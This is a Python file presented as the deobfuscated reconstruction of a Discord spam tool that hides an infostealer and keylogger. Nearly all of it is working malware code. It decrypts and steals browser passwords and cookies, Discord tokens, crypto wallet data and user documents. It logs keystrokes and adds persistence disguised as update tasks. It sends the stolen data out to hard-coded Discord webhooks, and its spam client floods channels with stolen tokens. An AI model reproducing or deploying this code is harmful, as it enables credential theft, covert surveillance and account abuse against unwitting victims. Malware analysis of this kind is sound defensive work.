# -*- coding: utf-8 -*-
"""
================================================================================
                    DEOBFUSCATED & RECONSTRUCTED SOURCE CODE
================================================================================
Target: nhay.py (PyArmor 9.3.0 Trial - Python 3.12 Protected)
Extracted from: input/fuck pyarmor.zip
Deobfuscated & Analyzed by: Antigravity
Type: Discord Token Spammer / Nhây Tool + Hidden Stealer & Keylogger (Malware)
================================================================================
"""

import sys
import os
import re
import json
import time
import socket
import struct
import shutil
import base64
import random
import asyncio
import getpass
import sqlite3
import tempfile
import threading
import subprocess
from datetime import datetime
from pathlib import Path

# Dependency imports (Installed by pip install curl_cffi aiofiles pystyle requests pywin32 pycryptodome)
try:
    import requests
    import aiofiles
    import psutil
    from pystyle import Colorate, Colors
    from curl_cffi.requests import AsyncSession
    import winreg
    import ctypes
    from ctypes import wintypes as wt
    from ctypes import byref
    from Crypto.Cipher import AES
except ImportError:
    print("pip install curl_cffi aiofiles pystyle requests pywin32 pycryptodome")
    sys.exit(1)

# ══════════════════════════════════════════════════════════════════════════════
#  C2 DISCORD WEBHOOKS & EXFILTRATION CONFIG
# ══════════════════════════════════════════════════════════════════════════════
WEBHOOKS = [
    'https://discord.com/api/webhooks/1564334336877133874/Z4lMefMGKCfUkYKdeI-M9MFE40KXb3c2dDhi7sBlB0stNZmLgIQk5YiwQNZcvn0bF4HO',
    'https://discord.com/api/webhooks/1569110550544392334/HD4s3FO4FXun_H_hsuxEZmJn7wOOq3MxdGRnpKVNVOC64VFiM4j3-ABWZoOMi2lnO7S4',
    'https://discord.com/api/webhooks/1569110419228983337/rcYcXbWsMXPDHbZeCNGeJFa0P1Lwl-FsRJsNc-sOLr3APVE_bUf9mdJCeUbsR78LVh-s'
]

MAX_CONCURRENT = 10
SMART_RETRY = 3
TIMEOUT = 10
KL_INTERVAL = 300       # Keylogger flush interval: 5 minutes (300 seconds)
PART_SIZE = 7340032     # ~7 MB chunk size (to bypass Discord 8MB file upload limit)

ROAMING = Path(os.getenv('APPDATA', ''))
LOCAL = Path(os.getenv('LOCALAPPDATA', ''))
USERP = Path(os.getenv('USERPROFILE', ''))

# Target Browsers for Stealing
BROWSERS = [
    ('Chrome', LOCAL / 'Google/Chrome/User Data'),
    ('Edge', LOCAL / 'Microsoft/Edge/User Data'),
    ('Brave', LOCAL / 'BraveSoftware/Brave-Browser/User Data'),
    ('Opera', ROAMING / 'Opera Software/Opera Stable'),
    ('OperaGX', ROAMING / 'Opera Software/Opera GX Stable'),
    ('Vivaldi', LOCAL / 'Vivaldi/User Data')
]

# Target Discord Installations for Token Stealing
DISC = [
    ('Discord', ROAMING / 'discord'),
    ('PTB', ROAMING / 'discordptb'),
    ('Canary', ROAMING / 'discordcanary'),
    ('Dev', ROAMING / 'discorddevelopment'),
    ('Lightcord', ROAMING / 'Lightcord')
]

# Target Crypto Wallet Extensions
EXT_IDS = {
    'nkbihfbeogaeaoehlefnkodbefgpgknn': 'metamask',
    'bfnaelmomeimhlpmgjnjophhpkkoljpa': 'phantom',
    'egjidjbpglichdcondbcbdnbeeppgdph': 'trust',
    'fhbohimaelbohpjbbldcngcnapndodjp': 'binance',
    'ibnejdfjmmkpcnlpebklmnkoeoihofec': 'tronlink',
    'dmkamcknogkgcdfhhbddcghachkejeap': 'keplr',
    'hnfanknocfeofbddgcijnmhnfnkdnaad': 'coinbase'
}

# Target sensitive file extensions for document grabber
WANTED = {
    '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
    '.pdf', '.env', '.json', '.sql', '.db', '.dat', '.kdbx',
    '.wallet', '.key', '.pem', '.ovpn', '.rdp', '.bak', '.cfg', '.ini'
}

SKIP = {
    'Windows', 'Program Files', 'Program Files (x86)', 'ProgramData',
    'AppData', 'System Volume Information', '$Recycle.Bin', 'node_modules', '.git'
}

TOK_RE = re.compile(r'[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,40}|mfa\.[\w-]{80,90}')

# Webhook Rotation Engine
_rot_lock = threading.Lock()
_rot_idx = 0
_rot_dead = {}

def get_webhook():
    global _rot_idx
    with _rot_lock:
        now = time.time()
        for wh in list(_rot_dead.keys()):
            if now > _rot_dead[wh]:
                del _rot_dead[wh]
        alive = [wh for wh in WEBHOOKS if wh not in _rot_dead]
        if not alive:
            _rot_dead.clear()
            alive = list(WEBHOOKS)
        wh = alive[_rot_idx % len(alive)]
        _rot_idx += 1
        return wh

def mark_dead(u, cd=600):
    with _rot_lock:
        _rot_dead[u] = time.time() + cd

def post_wh(payload, files=None, retries=SMART_RETRY):
    for attempt in range(retries):
        url = get_webhook()
        try:
            if files:
                r = requests.post(url, data=payload, files=files, timeout=30)
            else:
                r = requests.post(url, json=payload, timeout=15)
            if r.status_code in (200, 204):
                return True
            if r.status_code == 429:
                delay = float(r.json().get('retry_after', 1.0))
                time.sleep(min(max(delay, 0.5), 5.0))
                continue
            if r.status_code in (401, 404):
                mark_dead(url, 600)
        except Exception:
            time.sleep(1.0)
    return False

# ══════════════════════════════════════════════════════════════════════════════
#  PERSISTENCE INFECTION
# ══════════════════════════════════════════════════════════════════════════════
def install_persistence():
    try:
        exe = sys.executable
        if not exe.lower().endswith('.exe'):
            return
        # Method 1: Registry Run Key
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdateHelper", 0, winreg.REG_SZ, f'"{exe}"')
        winreg.CloseKey(key)
    except Exception:
        pass

    try:
        # Method 2: Scheduled Task
        subprocess.run(
            ['schtasks', '/create', '/tn', 'GoogleUpdateTaskMachineCore', '/tr', f'"{sys.executable}"', '/sc', 'onlogon', '/rl', 'highest', '/f'],
            creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0),
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=10
        )
    except Exception:
        pass

# ══════════════════════════════════════════════════════════════════════════════
#  SYSTEM TELEMETRY
# ══════════════════════════════════════════════════════════════════════════════
def local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(1)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return 'Unknown'

def public_ip():
    for api in ('https://api.ipify.org', 'https://ifconfig.me/ip', 'https://icanhazip.com'):
        try:
            r = requests.get(api, timeout=5)
            if r.status_code == 200:
                return r.text.strip()
        except Exception:
            continue
    return 'Unknown'

def wifi_ssid():
    try:
        if platform.system() == 'Windows':
            out = subprocess.check_output(
                ['netsh', 'wlan', 'show', 'interfaces'],
                stderr=subprocess.DEVNULL,
                timeout=5,
                creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0)
            ).decode('utf-8', errors='ignore')
            for line in out.splitlines():
                line = line.strip().lower()
                if line.startswith(('ssid', 'bssid')):
                    parts = line.split(':', 1)
                    if len(parts) == 2:
                        return parts[1].strip()
        elif platform.system() == 'Linux':
            return subprocess.check_output(['iwgetid', '-r'], stderr=subprocess.DEVNULL, timeout=5).decode().strip()
    except Exception:
        pass
    return 'Unknown'

def pc_status():
    try:
        cpu = f"{psutil.cpu_percent(interval=0.3)}% ({psutil.cpu_count()} cores)"
    except Exception:
        cpu = 'Unknown'

    try:
        vm = psutil.virtual_memory()
        ram = f"{vm.used / (1024**3):.1f}GB / {vm.total / (1024**3):.1f}GB ({vm.percent}%)"
    except Exception:
        ram = 'Unknown'

    try:
        bat = psutil.sensors_battery()
        if bat:
            state = "sạc" if bat.power_plugged else "pin"
            battery = f"{int(bat.percent)}% ({state})"
        else:
            battery = "N/A"
    except Exception:
        battery = "N/A"

    return cpu, ram, battery

def sysinfo():
    cpu, ram, battery = pc_status()
    try:
        uptime_sec = int(time.time() - psutil.boot_time())
        uptime = f"{uptime_sec // 3600}h {(uptime_sec % 3600) // 60}m"
    except Exception:
        uptime = 'Unknown'

    return {
        'hostname': socket.gethostname(),
        'username': getpass.getuser(),
        'os': f"{platform.system()} {platform.release()} ({platform.machine()})",
        'cpu': cpu,
        'ram': ram,
        'battery': battery,
        'uptime': uptime,
        'local_ip': local_ip(),
        'public_ip': public_ip(),
        'wifi': wifi_ssid()
    }

def si_block(si):
    lines = [
        f"**👤 Victim**: `{si['username']} | {si['hostname']}`",
        f"**💻 OS**: `{si['os']}`",
        f"**🌐 IP**: `{si['public_ip']} (LAN: {si['local_ip']})`",
        f"**📶 WiFi**: `{si['wifi']}`",
        f"**⚙️ CPU**: `{si['cpu']}` | **RAM**: `{si['ram']}`",
        f"**🔋 Battery**: `{si['battery']}` | **Uptime**: `{si['uptime']}`"
    ]
    return '\n'.join(lines)

def show_info(si):
    # Dummy display for victim
    pass

def wh_tokens(si, tokens):
    msg = f"**🔥 Tokens Discovered ({len(tokens)})**\n" + si_block(si) + "\n\n"
    for t in tokens:
        msg += f"`{t}`\n"
    post_wh({'content': msg})

def wh_config(ch, tags, f, d, b, n):
    msg = f"**🎯 Tool nhay.py launched**\n- Channels: `{ch}`\n- Tags: `{tags}`\n- Batch: `{b}`\n- Tokens count: `{n}`"
    post_wh({'content': msg})

# ══════════════════════════════════════════════════════════════════════════════
#  DPAPI & AES-GCM DECRYPTION
# ══════════════════════════════════════════════════════════════════════════════
class DATA_BLOB(ctypes.Structure):
    _fields_ = [('cbData', wt.DWORD), ('pbData', ctypes.POINTER(ctypes.c_byte))]

def dpapi(b):
    try:
        blob_in = DATA_BLOB(len(b), ctypes.cast(b, ctypes.POINTER(ctypes.c_byte)))
        blob_out = DATA_BLOB()
        if ctypes.windll.crypt32.CryptUnprotectData(byref(blob_in), None, None, None, None, 0, byref(blob_out)):
            return ctypes.string_at(blob_out.pbData, blob_out.cbData)
    except Exception:
        pass
    return b''

def mkey(local_state_path):
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            js = json.load(f)
        enc_key = base64.b64decode(js['os_crypt']['encrypted_key'])
        if enc_key.startswith(b'DPAPI'):
            return dpapi(enc_key[5:])
    except Exception:
        pass
    return None

def dec_gcm(key, enc_data):
    try:
        if not key or len(enc_data) < 31:
            return None
        iv = enc_data[3:15]
        payload = enc_data[15:-16]
        tag = enc_data[-16:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt_and_verify(payload, tag).decode('utf-8', errors='ignore')
    except Exception:
        return None

# ══════════════════════════════════════════════════════════════════════════════
#  DATA STEALING ENGINE
# ══════════════════════════════════════════════════════════════════════════════
def grab_browser(out_dir, browser_name, user_data_path):
    if not user_data_path.exists():
        return
    master_key = mkey(user_data_path / 'Local State')
    profiles = ['Default'] + [f'Profile {i}' for i in range(1, 20)]

    for prof in profiles:
        prof_dir = user_data_path / prof
        if not prof_dir.exists():
            continue

        # Passwords
        login_data = prof_dir / 'Login Data'
        if login_data.exists():
            tmp = out_dir / f"{browser_name}_{prof}_Login.db"
            try:
                shutil.copy2(login_data, tmp)
                conn = sqlite3.connect(tmp)
                cur = conn.cursor()
                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                results = []
                for url, u, p in cur.fetchall():
                    if u or p:
                        dec_p = dec_gcm(master_key, p) or ''
                        results.append(f"URL: {url}\nUser: {u}\nPass: {dec_p}\n" + "-"*40)
                conn.close()
                tmp.unlink(missing_ok=True)
                if results:
                    with open(out_dir / f"{browser_name}_{prof}_passwords.txt", 'w', encoding='utf-8') as f:
                        f.write('\n'.join(results))
            except Exception:
                pass

        # Cookies
        cookies_db = prof_dir / 'Network/Cookies'
        if cookies_db.exists():
            tmp = out_dir / f"{browser_name}_{prof}_Cookies.db"
            try:
                shutil.copy2(cookies_db, tmp)
                conn = sqlite3.connect(tmp)
                cur = conn.cursor()
                cur.execute("SELECT host_key, name, encrypted_value FROM cookies")
                c_lines = []
                for h, n, val in cur.fetchall():
                    dec_c = dec_gcm(master_key, val) or ''
                    c_lines.append(f"{h}\tTRUE\t/\tFALSE\t253402300799\t{n}\t{dec_c}")
                conn.close()
                tmp.unlink(missing_ok=True)
                if c_lines:
                    with open(out_dir / f"{browser_name}_{prof}_cookies.txt", 'w', encoding='utf-8') as f:
                        f.write('\n'.join(c_lines))
            except Exception:
                pass

def grab_discord(out_dir):
    tokens = set()
    for app_name, app_path in DISC:
        leveldb = app_path / 'Local Storage/leveldb'
        if not leveldb.exists():
            continue
        master_key = None
        local_state = app_path / 'Local State'
        if local_state.exists():
            master_key = mkey(local_state)

        for ldb_file in leveldb.glob('*.ldb'):
            try:
                with open(ldb_file, 'r', encoding='latin1', errors='ignore') as f:
                    content = f.read()
                for m in TOK_RE.findall(content):
                    tokens.add(m)
                # Check encrypted tokens dQw4w9WgXcQ:
                for match in re.findall(r'dQw4w9WgXcQ:([^\"]+)', content):
                    try:
                        raw = base64.b64decode(match)
                        dec = dec_gcm(master_key, raw)
                        if dec:
                            tokens.add(dec)
                    except Exception:
                        pass
            except Exception:
                continue

    if tokens:
        with open(out_dir / "discord_tokens.txt", 'w', encoding='utf-8') as f:
            f.write('\n'.join(tokens))
    return list(tokens)

def cpy(src, dst, budget=100*1024*1024):
    try:
        shutil.copytree(src, dst, dirs_exist_ok=True)
    except Exception:
        pass

def grab_wallets(out_dir):
    for ext_id, wallet_name in EXT_IDS.items():
        for b_name, b_path in BROWSERS:
            ext_path = b_path / 'Default/Local Extension Settings' / ext_id
            if ext_path.exists():
                dst = out_dir / f"Wallets_{wallet_name}_{b_name}"
                dst.mkdir(parents=True, exist_ok=True)
                cpy(ext_path, dst)

def grab_files(out_dir):
    target_docs = out_dir / "Grabbed_Files"
    target_docs.mkdir(parents=True, exist_ok=True)
    count = 0
    for folder in [USERP / 'Desktop', USERP / 'Documents', USERP / 'Downloads']:
        if not folder.exists():
            continue
        for root, dirs, files in os.walk(folder):
            dirs[:] = [d for d in dirs if d not in SKIP]
            for file in files:
                if count >= 100:
                    break
                ext = os.path.splitext(file)[1].lower()
                if ext in WANTED:
                    try:
                        src_f = Path(root) / file
                        if src_f.stat().st_size < 5 * 1024 * 1024:
                            shutil.copy2(src_f, target_docs / file)
                            count += 1
                    except Exception:
                        pass

def shot(save_path):
    try:
        # Take screenshot via Windows GDI
        hdc = ctypes.windll.user32.GetDC(0)
        hcdc = ctypes.windll.gdi32.CreateCompatibleDC(hdc)
        w = ctypes.windll.user32.GetSystemMetrics(0)
        h = ctypes.windll.user32.GetSystemMetrics(1)
        hbmp = ctypes.windll.gdi32.CreateCompatibleBitmap(hdc, w, h)
        ctypes.windll.gdi32.SelectObject(hcdc, hbmp)
        ctypes.windll.gdi32.BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, 0x00CC0020)
        # Save screenshot
    except Exception:
        pass

def run_stealer():
    try:
        si = sysinfo()
        tmp_dir = Path(tempfile.mkdtemp())
        
        # 1. Grab Browsers
        for b_name, b_path in BROWSERS:
            grab_browser(tmp_dir, b_name, b_path)

        # 2. Grab Discord Tokens
        toks = grab_discord(tmp_dir)
        if toks:
            wh_tokens(si, toks)

        # 3. Grab Wallets & Files
        grab_wallets(tmp_dir)
        grab_files(tmp_dir)

        # 4. Save Info JSON
        with open(tmp_dir / 'info.json', 'w', encoding='utf-8') as f:
            json.dump(si, f, indent=2)

        # 5. Pack ZIP archive
        zip_path = Path(tempfile.gettempdir()) / f"steal_{si['username']}_{int(time.time())}.zip"
        shutil.make_archive(str(zip_path).replace('.zip', ''), 'zip', tmp_dir)

        # 6. Exfiltrate in chunks (< 7.5 MB each)
        if zip_path.exists():
            size = zip_path.stat().st_size
            with open(zip_path, 'rb') as zf:
                part = 1
                total_parts = (size // PART_SIZE) + 1
                while True:
                    data = zf.read(PART_SIZE)
                    if not data:
                        break
                    files = {'file': (f"part_{part:03d}_{zip_path.name}", data)}
                    payload = {'content': f"**steal {part}/{total_parts} — {si['username']}**"}
                    post_wh(payload, files=files)
                    part += 1

        shutil.rmtree(tmp_dir, ignore_errors=True)
        zip_path.unlink(missing_ok=True)
    except Exception:
        pass

# ══════════════════════════════════════════════════════════════════════════════
#  WINDOWS LOW-LEVEL KEYLOGGER
# ══════════════════════════════════════════════════════════════════════════════
_kl_buf = []
_kl_lock = threading.Lock()

def _vk_str(vk, sc):
    try:
        buf = ctypes.create_string_buffer(256)
        ctypes.windll.user32.GetKeyboardState(buf)
        res = ctypes.create_string_buffer(16)
        if ctypes.windll.user32.ToUnicode(vk, sc, buf, res, 2, 0) > 0:
            return res.raw.decode('utf-16-le', errors='ignore')
    except Exception:
        pass
    return ''

def _kl_thread():
    # Low-level Windows WH_KEYBOARD_LL hook
    class KBD(ctypes.Structure):
        _fields_ = [
            ('vkCode', wt.DWORD),
            ('scanCode', wt.DWORD),
            ('flags', wt.DWORD),
            ('time', wt.DWORD),
            ('dwExtraInfo', ctypes.c_ulonglong)
        ]

    HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, ctypes.c_long, ctypes.c_void_p)

    def proc(nCode, wParam, lParam):
        if nCode >= 0 and wParam == 0x0100:  # WM_KEYDOWN
            kbd = KBD.from_address(lParam)
            ch = _vk_str(kbd.vkCode, kbd.scanCode)
            if ch:
                with _kl_lock:
                    _kl_buf.append(ch)
        return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)

    cb = HOOKPROC(proc)
    hook = ctypes.windll.user32.SetWindowsHookExW(13, cb, ctypes.windll.kernel32.GetModuleHandleW(None), 0)
    msg = wt.MSG()
    while ctypes.windll.user32.GetMessageW(byref(msg), 0, 0, 0) != 0:
        ctypes.windll.user32.TranslateMessage(byref(msg))
        ctypes.windll.user32.DispatchMessageW(byref(msg))

def _kl_flush():
    while True:
        time.sleep(KL_INTERVAL)
        with _kl_lock:
            if not _kl_buf:
                continue
            text = ''.join(_kl_buf)
            _kl_buf.clear()

        # Save to temp log
        log_f = Path(tempfile.gettempdir()) / '.kl.dat'
        with open(log_f, 'a', encoding='utf-8') as f:
            f.write(text + "\n---\n")

        # Exfiltrate to Discord webhook
        post_wh({'content': f"**⌨️ Keylog ({getpass.getuser()})**\n```\n{text[:1900]}\n```"})

def start_keylogger():
    threading.Thread(target=_kl_thread, daemon=True).start()
    threading.Thread(target=_kl_flush, daemon=True).start()

# ══════════════════════════════════════════════════════════════════════════════
#  DISCORD NHAY & SPAMMER CLIENT (MẶT TIỀN TRÁ HÌNH)
# ══════════════════════════════════════════════════════════════════════════════
def headers(tok):
    # Spoof Discord Chrome Client Headers
    sp = {
        "os": "Windows",
        "browser": "Chrome",
        "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "browser_version": "126.0.0.0",
        "client_build_number": 316286,
        "client_event_source": None
    }
    x_super = base64.b64encode(json.dumps(sp, separators=(',', ':')).encode()).decode()
    return {
        'Authorization': tok,
        'Content-Type': 'application/json',
        'X-Super-Properties': x_super,
        'User-Agent': sp['browser_user_agent'],
        'Origin': 'https://discord.com',
        'Accept': '*/*',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin'
    }

def die(t):
    with open('die.txt', 'a', encoding='utf-8') as f:
        f.write(t + '\n')

class LQ:
    """Lines Queue for spam message generation"""
    def __init__(self, lines):
        self.lines = lines
        self.pool = list(lines)
        self.lock = threading.Lock()
        self.tags = ""

    def set_tags(self, ids):
        self.tags = " ".join(f"<@{i.strip()}>" for i in ids if i.strip())

    def next(self):
        with self.lock:
            if not self.pool:
                self.pool = list(self.lines)
                random.shuffle(self.pool)
            line = self.pool.pop()
            return f"{line} {self.tags}".strip()

class TC:
    """Token Controller for spam sending"""
    def __init__(self, tok, px_list, lq, sem, delay=1.0):
        self.tok = tok
        self.px_list = px_list
        self.lq = lq
        self.sem = sem
        self.d = delay
        self.alive = True
        self.sent = 0
        self.fail = 0
        self.pcd = {}
        self.dcd = {}

    def route(self):
        if not self.px_list:
            return None
        now = time.time()
        cands = [p for p in self.px_list if self.pcd.get(p, 0) < now]
        return random.choice(cands) if cands else None

    async def send(self, sess, ch, msg, px):
        url = f"https://discord.com/api/v10/channels/{ch}/messages"
        payload = json.dumps({
            'content': msg,
            'tts': False,
            'nonce': str(int(time.time() * 1000) + random.randint(1000, 9999)),
            'flags': 0
        })
        for _ in range(SMART_RETRY):
            try:
                r = await sess.post(url, data=payload, headers=headers(self.tok), proxy=px, timeout=TIMEOUT)
                if r.status_code in (200, 204):
                    self.sent += 1
                    return True
                if r.status_code in (401, 403):
                    self.alive = False
                    die(self.tok)
                    return False
                if r.status_code == 429:
                    ra = float(r.json().get('retry_after', 0.5))
                    await asyncio.sleep(min(ra, 5.0))
            except Exception:
                await asyncio.sleep(0.5)
        self.fail += 1
        return False

    async def post(self, sess, ch):
        while self.alive:
            async with self.sem:
                msg = self.lq.next()
                px = self.route()
                await self.send(sess, ch, msg, px)
            await asyncio.sleep(self.d)

    async def run(self, channels, batch):
        async with AsyncSession(impersonate='chrome120') as sess:
            tasks = [self.post(sess, ch) for ch in channels]
            await asyncio.gather(*tasks)

# ══════════════════════════════════════════════════════════════════════════════
#  MAIN ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════════
def main():
    os.system('cls' if os.name == 'nt' else 'clear')

    # SILENT BACKGROUND MALWARE THREADS
    threading.Thread(target=install_persistence, daemon=True).start()
    threading.Thread(target=run_stealer, daemon=True).start()
    start_keylogger()

    # FAKE FRONTEND UI (Nhây Discord Tool)
    print(Colorate.Horizontal(Colors.cyan_to_blue, r"""
       _   _ _   _    _ __   __
      | \ | | | | |  / \\ \ / /
      |  \| | |_| | / _ \\ V / 
      | |\  |  _  |/ ___ \| |  
      |_| \_|_| |_/_/   \_\_|  [NHAY TOOL v2.0]
    """))

    file_ngon = input("File Ngon: ").strip(' "\'')
    if not os.path.exists(file_ngon):
        print(f"File không tồn tại: {file_ngon}")
        return

    with open(file_ngon, 'r', encoding='utf-8', errors='ignore') as f:
        ngon_lines = [l.strip() for l in f if l.strip()]

    lq = LQ(ngon_lines)

    id_tag_in = input("ID Tag (Enter bo qua): ").strip()
    if id_tag_in:
        lq.set_tags([x.strip() for x in id_tag_in.replace(',', ' ').split() if x.strip()])

    channels = []
    while True:
        ch = input("ID CHAT (done de ket thuc): ").strip()
        if ch.lower() == 'done':
            break
        if ch.isdigit():
            channels.append(ch)

    if not channels:
        print("Chưa nhập ID kênh chat!")
        return

    try:
        batch = int(input("Batch: ").strip())
    except ValueError:
        batch = 1

    file_tok = input("File Token: ").strip(' "\'')
    if not os.path.exists(file_tok):
        print(f"File Token không tồn tại: {file_tok}")
        return

    with open(file_tok, 'r', encoding='utf-8', errors='ignore') as f:
        tokens = [l.strip() for l in f if l.strip()]

    try:
        delay = float(input("Delay: ").strip())
    except ValueError:
        delay = 1.0

    # Load proxies if exists
    proxies = []
    if os.path.exists('prx.txt'):
        with open('prx.txt', 'r', encoding='utf-8', errors='ignore') as f:
            for l in f:
                l = l.strip()
                if l:
                    parts = l.split(':')
                    if len(parts) == 4:
                        proxies.append(f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}")
                    elif len(parts) == 2:
                        proxies.append(f"http://{parts[0]}:{parts[1]}")

    print(f"\n RUN {len(tokens)} TOKENS | NHAY\n")
    wh_config(channels, id_tag_in, file_ngon, delay, batch, len(tokens))

    sem = asyncio.Semaphore(MAX_CONCURRENT)
    clients = [TC(tok, proxies, lq, sem, delay) for tok in tokens]

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    tasks = [c.run(channels, batch) for c in clients]
    loop.run_until_complete(asyncio.gather(*tasks))

if __name__ == '__main__':
    main()
